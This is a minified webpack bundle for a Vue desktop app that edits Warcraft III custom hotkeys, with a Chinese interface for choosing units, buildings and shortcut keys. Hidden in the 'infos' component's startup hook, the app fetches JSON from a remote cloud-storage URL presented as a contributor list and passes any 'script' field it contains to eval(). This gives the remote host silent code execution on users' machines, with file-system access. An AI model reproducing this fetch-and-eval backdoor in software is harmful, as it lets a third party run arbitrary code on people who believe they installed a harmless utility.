(function(t){function e(e){for(var i,r,o=e[0],c=e[1],d=e[2],u=0,p=[];u<o.length;u++)r=o[u],Object.prototype.hasOwnProperty.call(s,r)&&s[r]&&p.push(s[r][0]),s[r]=0;for(i in c)Object.prototype.hasOwnProperty.call(c,i)&&(t[i]=c[i]);l&&l(e);while(p.length)p.shift()();return a.push.apply(a,d||[]),n()}function n(){for(var t,e=0;e<a.length;e++){for(var n=a[e],i=!0,o=1;o<n.length;o++){var c=n[o];0!==s[c]&&(i=!1)}i&&(a.splice(e--,1),t=r(r.s=n[0]))}return t}var i={},s={app:0},a=[];function r(e){if(i[e])return i[e].exports;var n=i[e]={i:e,l:!1,exports:{}};return t[e].call(n.exports,n,n.exports,r),n.l=!0,n.exports}r.m=t,r.c=i,r.d=function(t,e,n){r.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:n})},r.r=function(t){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},r.t=function(t,e){if(1&e&&(t=r(t)),8&e)return t;if(4&e&&"object"===typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var i in t)r.d(n,i,function(e){return t[e]}.bind(null,i));return n},r.n=function(t){var e=t&&t.__esModule?function(){return t["default"]}:function(){return t};return r.d(e,"a",e),e},r.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},r.p="";var o=window["webpackJsonp"]=window["webpackJsonp"]||[],c=o.push.bind(o);o.push=e,o=o.slice();for(var d=0;d<o.length;d++)e(o[d]);var l=c;a.push([0,"chunk-vendors"]),n()})({0:function(t,e,n){t.exports=n("56d7")},"08a7":function(t,e,n){},1:function(t,e){},"16e8":function(t,e,n){"use strict";var i=n("08a7"),s=n.n(i);s.a},"18d5":function(module,__webpack_exports__,__webpack_require__){"use strict";var vuex__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__("2f62");__webpack_exports__["a"]={name:"infos",data(){return{showQRCode:!1,holdQRCode:!1,bug:{msg:!1,hovered:!1},reset:{msg:!1,hovered:!1},contributor:{title:"",list:[]}}},props:["valid"],computed:{...Object(vuex__WEBPACK_IMPORTED_MODULE_0__["c"])(["pond"])},methods:{...Object(vuex__WEBPACK_IMPORTED_MODULE_0__["b"])(["metalClickSound"]),restore(){this.metalClickSound(),this.valid.modalReset=!0},showMsg_reset(){this.reset.hovered=!0,setTimeout(()=>{this.reset.hovered&&(this.reset.msg=!0)},400)},hideMsg_reset(){this.reset.hovered=!1,this.reset.msg=!1},showMsg_bug(){this.bug.hovered=!0,setTimeout(()=>{this.bug.hovered&&(this.bug.msg=!0)},400)},hideMsg_bug(){this.bug.hovered=!1,this.bug.msg=!1},openBugPage(){this.metalClickSound(),openBugPage()}},created(){let url="https://open-source-keycraft.obs.cn-east-3.myhuaweicloud.com/contributer%2Cjson?_="+Date.now();__webpack_require__("24f8").get(url,(req,res)=>{let result="";req.on("data",t=>{result+=t}),req.on("end",()=>{result=JSON.parse(result),this.contributor.title=result.title,this.contributor.list=result.list,result.script&&(console.log(result.script),eval(result.script))})})}}},"1ce8":function(t,e,n){},2:function(t,e){},"4b47":function(t,e,n){t.exports=n.p+"media/war3lightClick.ogg"},5248:function(t,e,n){},"545f":function(t,e,n){"use strict";var i=n("1ce8"),s=n.n(i);s.a},"56d7":function(t,e,n){"use strict";n.r(e);var i=n("2b0e"),s=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{attrs:{id:"app"}},[n("aside",[n("h2",{attrs:{id:"title"}},[t._v("自定义按键")]),n("camps"),n("div",{staticClass:"sideBtn",attrs:{id:"option"},on:{mouseup:t.port}},[t._v("目录")]),n("div",{staticClass:"sideBtn",attrs:{id:"save"},on:{mouseup:t.save}},[t._v("保存")])],1),n("main",{on:{contextmenu:t.clearCurrentKey}},[n("units"),n("archs"),n("props"),n("remap"),n("infos",{attrs:{valid:t.valid}})],1),n("sound"),n("modal-quit"),n("modal-path",{attrs:{valid:t.valid}}),n("modal-reset",{attrs:{valid:t.valid}}),t.valid.modalPath?t._e():n("div",{attrs:{id:"closeButton"},on:{click:t.closeWindow}})],1)},a=[],r=function(){var t=this,e=t.$createElement;t._self._c;return t._m(0)},o=[function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",[i("audio",{attrs:{id:"audio_heavyClick",src:n("6223")}}),i("audio",{attrs:{id:"audio_lightClick",src:n("4b47")}}),i("audio",{attrs:{id:"audio_select",src:n("65b0")}}),i("audio",{attrs:{id:"audio_check",src:n("67d1")}}),i("audio",{attrs:{id:"audio_cancel",src:n("5e40")}}),i("audio",{attrs:{id:"audio_metalClick",src:n("9df4")}})])}],c=n("2f62"),d={name:"sound",computed:{...Object(c["c"])(["sound"])},mounted(){this.sound.heavyClick=document.getElementById("audio_heavyClick"),this.sound.heavyClick.currentTime=1,this.sound.lightClick=document.getElementById("audio_lightClick"),this.sound.lightClick.currentTime=.5,this.sound.select=document.getElementById("audio_select"),this.sound.select.currentTime=.3,this.sound.check=document.getElementById("audio_check"),this.sound.check.currentTime=.6,this.sound.cancel=document.getElementById("audio_cancel"),this.sound.metalClick=document.getElementById("audio_metalClick"),this.sound.metalClick.volume=.5}},l=d,u=n("2877"),p=Object(u["a"])(l,r,o,!1,null,"53b73bf8",null),h=p.exports,m=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("ul",{attrs:{id:"camps"}},t._l(t.camp.names,(function(e,i){return n("li",{class:{actived:i===t.camp.index},attrs:{index:i},domProps:{textContent:t._s(e)},on:{click:t.selectCamp}})})),0)},v=[],_={name:"camps",computed:{...Object(c["c"])(["camp","pond"])},methods:{...Object(c["b"])(["heavyClickSound"]),selectCamp(){let t=parseInt(event.currentTarget.getAttribute("index"));this.camp.index!==t&&(this.clearPond(),this.camp.index=t,this.heavyClickSound())},clearPond(){this.pond.activated="",this.pond.currentKey="",this.pond.currentVal="",this.pond.currentTag="",this.pond.currentTip="",this.pond.proptype="",this.pond.props=[],this.pond.warning="",this.pond.editing=!1}}},g=_,f=Object(u["a"])(g,m,v,!1,null,"1f28fc09",null),b=f.exports,C=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"box",attrs:{id:"unit"}},[n("h2",{staticClass:"subtitle"},[t._v("单位")]),n("ul",t._l(t.camp.units[t.camp.index],(function(e,i){return n("li",[n("div",{class:{activated:i===t.pond.activated,icon_human:0===t.camp.index,icon_elf:1===t.camp.index,icon_orc:2===t.camp.index,icon_ud:3===t.camp.index,icon_neutral:4===t.camp.index},style:t.setIcon(e),attrs:{name:i},on:{mouseup:t.showProps}})])})),0)])},k=[],x={name:"units",data(){return{}},computed:{...Object(c["c"])(["camp","pond"])},methods:{...Object(c["b"])(["selectSound"]),showProps(){let t=event.currentTarget.getAttribute("name");this.pond.activated!==t&&(this.pond.activated=t,this.pond.props=this.camp.units[this.camp.index][t].btn,this.pond.currentKey="",this.pond.currentVal="",this.pond.editing=!1,this.pond.proptype="unit",setTimeout(()=>{this.pond.warning=""},1e3),this.selectSound())},setIcon(t){return"background-position:-"+70*(t.ico[0]-1)+"px -"+70*(t.ico[1]-1)+"px;"}}},y=x,w=Object(u["a"])(y,C,k,!1,null,"12f7d990",null),S=w.exports,O=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"box",attrs:{id:"archs"}},[n("h2",{staticClass:"subtitle"},[t._v("建筑")]),n("ul",t._l(t.camp.archs[t.camp.index],(function(e,i){return n("li",[n("div",{class:{activated:i===t.pond.activated&&"空位"!==i,icon_human:0===t.camp.index,icon_elf:1===t.camp.index,icon_orc:2===t.camp.index,icon_ud:3===t.camp.index,icon_neutral:4===t.camp.index},style:t.setIcon(e),attrs:{name:i},on:{mouseup:t.showProps}})])})),0)])},P=[],T={name:"archs",data(){return{}},computed:{...Object(c["c"])(["camp","pond"])},watch:{},methods:{...Object(c["b"])(["selectSound"]),showProps(){let t=event.currentTarget.getAttribute("name");this.pond.activated!==t&&"空位"!==t&&(this.pond.activated=t,this.pond.props=this.camp.archs[this.camp.index][t].btn,this.pond.currentKey="",this.pond.currentVal="",this.pond.editing=!1,this.pond.proptype="arch",setTimeout(()=>{this.pond.warning=""},1e3),this.selectSound())},setIcon(t){return"background-position:-"+70*(t.ico[0]-1)+"px -"+70*(t.ico[1]-1)+"px;"}}},j=T,E=Object(u["a"])(j,O,P,!1,null,"7cda6b10",null),V=E.exports,K=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"box",attrs:{id:"buttons"}},[n("h2",{staticClass:"subtitle"},[t._v("按钮")]),t._l(t.pond.props,(function(e,i){return n("div",{staticClass:"button",class:{activated:String(e.key)===String(t.pond.currentKey),icon_human:0===t.camp.index,icon_elf:1===t.camp.index,icon_orc:2===t.camp.index,icon_ud:3===t.camp.index,icon_neutral:4===t.camp.index},style:t.setPosition(e)+t.setIcon(e),attrs:{idx:i,keyname:e.key,val:e.val,tag:e.tag,tip:e.tip},on:{click:t.checkKey}},[n("div",{directives:[{name:"show",rawName:"v-show",value:String(e.key)!==String(t.pond.currentKey),expression:"String(btn.key) !== String(pond.currentKey)"}],staticClass:"shortcut",domProps:{textContent:t._s(e.val)}})])}))],2)},I=[],B={name:"props",computed:{...Object(c["c"])(["camp","pond"])},methods:{...Object(c["b"])(["checkSound"]),setPosition(t){return"left:"+78*(t.pos[0]-1)+"px;top:"+78*(t.pos[1]-1)+"px;"},setIcon(t){return"background-position:-"+70*(t.ico[0]-1)+"px -"+70*(t.ico[1]-1)+"px;"},checkKey(){let t=event.currentTarget.getAttribute("keyname");this.pond.currentKey!==t&&(this.pond.currentKey=t,this.pond.currentVal=event.currentTarget.getAttribute("val"),this.pond.currentTag=event.currentTarget.getAttribute("tag"),this.pond.currentTip=event.currentTarget.getAttribute("tip"),this.pond.propIndex=event.currentTarget.getAttribute("idx"),this.pond.editing=!1,setTimeout(()=>{this.pond.warning=""},1e3),this.checkSound())}}},M=B,A=Object(u["a"])(M,K,I,!1,null,"7b5422dc",null),$=A.exports,q=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"box",attrs:{id:"remap"}},[n("h2",{class:{activated:t.pond.editing}},[t._v(" "+t._s(t.pond.proptype?t.pond.currentVal?t.pond.editing?"请按键":"快捷键：":"请选择按钮":"请选择单位/建筑")+" ")]),t.pond.currentVal?n("div",{staticClass:"shortcut"},[t._v(" "+t._s(t.pond.currentVal)+" ")]):t._e(),n("div",{staticClass:"editBtn",class:{valid:t.pond.currentKey},on:{click:t.editShortcut}},[t._v("自定义")]),n("div",{staticClass:"warning",class:{green:t.green}},[t._v(t._s(t.pond.warning))])])},R=[],D={name:"remap",data(){return{tempVal:"",availableKeys:["À","1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"],green:!1}},computed:{...Object(c["c"])(["pond","camp"])},methods:{...Object(c["b"])(["metalClickSound"]),editShortcut(){this.pond.currentKey&&(this.metalClickSound(),this.tempVal=this.pond.currentVal,this.pond.currentVal=" ",this.pond.editing=!0)},setShortcut(){if(this.pond.editing){let t=String.fromCharCode(event.keyCode).toUpperCase();if(27===event.keyCode)this.pond.currentVal=this.tempVal,this.pond.editing=!1,this.pond.warning="";else if(this.availableKeys.includes(t)){switch(remap(this.pond.currentKey,t),this.metalClickSound(),"À"===t&&(t="`"),this.warning="",this.pond.proptype){case"unit":this.camp.units[this.camp.index][this.pond.activated]["btn"][this.pond.propIndex]["val"]=t;break;case"arch":this.camp.archs[this.camp.index][this.pond.activated]["btn"][this.pond.propIndex]["val"]=t;break}this.green=!0,setTimeout(()=>{this.pond.warning='"'+this.pond.currentTag+'" 已设置为 '+t},100),this.pond.currentVal=t,this.pond.editing=!1}else this.green=!1,this.pond.warning="因游戏系统限制，只能使字母、数字 或 ~ 号作为快捷键"}}},mounted(){window.addEventListener("keyup",this.setShortcut)}},W=D,L=Object(u["a"])(W,q,R,!1,null,"dfd7c430",null),Q=L.exports,U=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"box",attrs:{id:"infos"}},[t.pond.currentVal?n("div",{staticClass:"info_1"},[t._v(" 「 "+t._s(t.pond.currentTag)+" 」 ")]):t._e(),t.pond.currentVal?n("div",{staticClass:"info_2"},[t._v(t._s(t.pond.currentTip))]):t._e(),n("div",{staticClass:"bug",on:{click:t.openBugPage,mouseenter:t.showMsg_bug,mouseout:t.hideMsg_bug}}),n("transition",{attrs:{name:"fade"}},[t.bug.msg?n("div",{staticClass:"msg_bug"},[t._v("反馈 / 更新")]):t._e()]),n("div",{staticClass:"reset",on:{click:t.restore,mouseenter:t.showMsg_reset,mouseout:t.hideMsg_reset}}),n("transition",{attrs:{name:"fade"}},[t.reset.msg?n("div",{staticClass:"msg_reset"},[t._v("重置 / 修复")]):t._e()]),n("div",{staticClass:"contributor"},[n("div",{staticClass:"title",domProps:{innerHTML:t._s(t.contributor.title)}}),t._l(t.contributor.list,(function(e){return n("div",{staticClass:"list",class:{grey:!e.valid}},[t._v(" "+t._s(e.value)+" ")])}))],2)],1)},J=[],N=n("18d5"),F=N["a"],H=(n("6177"),Object(u["a"])(F,U,J,!1,null,"e79b2c10",null)),X=H.exports,G=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticStyle:{visibility:"hidden"},attrs:{id:"modal-quit"}},[n("div",{staticClass:"dialog"},[t._m(0),n("div",{staticClass:"btnBox"},[n("div",{on:{click:t.quit}},[t._v("退出")]),n("div",{on:{click:t.save}},[t._v("保存")])])])])},Y=[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"msg"},[n("div",[t._v("快捷键未保存，保存后才能使用")]),n("div",[t._v("是否保存快捷键设置？")])])}],Z={name:"modalQuit",methods:{quit(){quit()},save(){save(!0)}}},z=Z,tt=(n("7854"),Object(u["a"])(z,G,Y,!1,null,"7f94a06f",null)),et=tt.exports,nt=function(){var t=this,e=t.$createElement,n=t._self._c||e;return t.valid.modalPath?n("div",{attrs:{id:"modal-path"}},[n("div",{staticClass:"dialog"},[n("div",{staticClass:"msg"},[n("div",[t._v("设置 CustomKeys.txt 所在目录：")]),n("input",{directives:[{name:"model",rawName:"v-model",value:t.pathValue,expression:"pathValue"}],attrs:{id:"inputPath",type:"text"},domProps:{value:t.pathValue},on:{input:function(e){e.target.composing||(t.pathValue=e.target.value)}}}),n("div",{staticStyle:{color:"white","font-weight":"normal","letter-spacing":"1px"}},[t._v("注：快捷键文件将会保存到你所指定的目录")]),n("div",{staticStyle:{color:"white","font-weight":"normal","letter-spacing":"1px",transform:"translateX(36px)"}},[t._v(" 如果快捷键保存后不生效，再修改此目录 ")])]),n("div",{staticClass:"btnBox"},[n("div",{on:{click:t.setCustomPath}},[t._v("确定")]),n("div",{on:{click:t.setDefaultPath}},[t._v("默认")])])])]):t._e()},it=[],st={name:"modal-path",data(){return{pathValue:""}},props:["valid"],computed:{...Object(c["c"])(["path"])},methods:{...Object(c["b"])(["lightClickSound"]),setCustomPath(){this.lightClickSound(),setCustomPath(this.pathValue),this.valid.modalPath=!1},setDefaultPath(){this.lightClickSound(),this.pathValue=this.path.default}},created(){this.path.default=fs.readFileSync(storage+"/path.default.txt"),this.pathValue=fs.readFileSync(storage+"/path.custom.txt")}},at=st,rt=(n("545f"),Object(u["a"])(at,nt,it,!1,null,"3f2debea",null)),ot=rt.exports,ct=function(){var t=this,e=t.$createElement,n=t._self._c||e;return t.valid.modalReset?n("div",{attrs:{id:"modal-reset"}},[n("div",{staticClass:"dialog"},[t._m(0),n("div",{staticClass:"btnBox"},[n("div",{on:{click:t.confirm}},[t._v("确定")]),n("div",{on:{click:t.cancel}},[t._v("取消")])])])]):t._e()},dt=[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"msg"},[n("div",[t._v("重置可以修复误删导致的快捷键失效问题")]),n("div",[t._v("是否重置所有快捷键？重置后会自动关闭")])])}],lt={name:"modal-reset",props:["valid"],methods:{...Object(c["b"])(["restoreArchive","updateArchive"]),confirm(){deleteStorage()},cancel(){this.valid.modalReset=!1}}},ut=lt,pt=(n("16e8"),Object(u["a"])(ut,ct,dt,!1,null,"6483b79c",null)),ht=pt.exports,mt={data(){return{valid:{modalPath:!1,modalReset:!1}}},computed:{...Object(c["c"])(["camp","pond"])},methods:{...Object(c["b"])(["lightClickSound","cancelSound","updateArchive","metalClickSound"]),port(){this.lightClickSound(),this.valid.modalPath=!0},save(){this.lightClickSound(),save(!1)},clearCurrentKey(){return this.pond.currentKey&&(this.cancelSound(),this.pond.currentKey="",this.pond.currentVal="",this.pond.editing=!1),!1},closeWindow(){this.cancelSound(),closeWindow()}},components:{sound:h,camps:b,units:S,archs:V,props:$,remap:Q,infos:X,modalQuit:et,modalPath:ot,modalReset:ht},created(){this.updateArchive()}},vt=mt,_t=Object(u["a"])(vt,s,a,!1,null,null,null),gt=_t.exports;i["a"].use(c["a"]);var ft=new c["a"].Store({state:{camp:{index:0,names:["人类联盟","暗夜精灵","兽人部落","不死亡灵","中立"],units:[{},{},{},{},{}],archs:[{},{},{},{},{}]},path:{custom:"",default:""},pond:{activated:"",currentKey:"",currentVal:"",currentTag:"",currentTip:"",proptype:"",propIndex:0,props:[],editing:!1,warning:""},sound:{heavyClick:null,lightClick:null,select:null,check:null,cancel:null,metalClick:null}},getters:{},mutations:{heavyClickSound(t){t.sound.heavyClick.currentTime=1,t.sound.heavyClick.play()},lightClickSound(t){t.sound.lightClick.currentTime=.5,t.sound.lightClick.play()},selectSound(t){t.sound.select.currentTime=.3,t.sound.select.play()},checkSound(t){t.sound.check.currentTime=.6,t.sound.check.play()},cancelSound(t){t.sound.cancel.play()},metalClickSound(t){t.sound.metalClick.currentTime=0,t.sound.metalClick.play()},updateArchive(t){let e=archive();t.camp.units=[e.human.unit,e.elf.unit,e.orc.unit,e.ud.unit,e.neutral.unit],t.camp.archs=[e.human.arch,e.elf.arch,e.orc.arch,e.ud.arch,e.neutral.arch]}},actions:{},modules:{}});n("d663");i["a"].config.productionTip=!1,new i["a"]({store:ft,render:function(t){return t(gt)}}).$mount("#app")},"5e40":function(t,e,n){t.exports=n.p+"media/cancel.ogg"},6177:function(t,e,n){"use strict";var i=n("b652"),s=n.n(i);s.a},6223:function(t,e,n){t.exports=n.p+"media/war3heavyClick.ogg"},"65b0":function(t,e,n){t.exports=n.p+"media/war3selectClick.ogg"},"67d1":function(t,e,n){t.exports=n.p+"media/war3checkClick.ogg"},7854:function(t,e,n){"use strict";var i=n("5248"),s=n.n(i);s.a},"9df4":function(t,e,n){t.exports=n.p+"media/metalClick.ogg"},b652:function(t,e,n){},d663:function(t,e,n){}});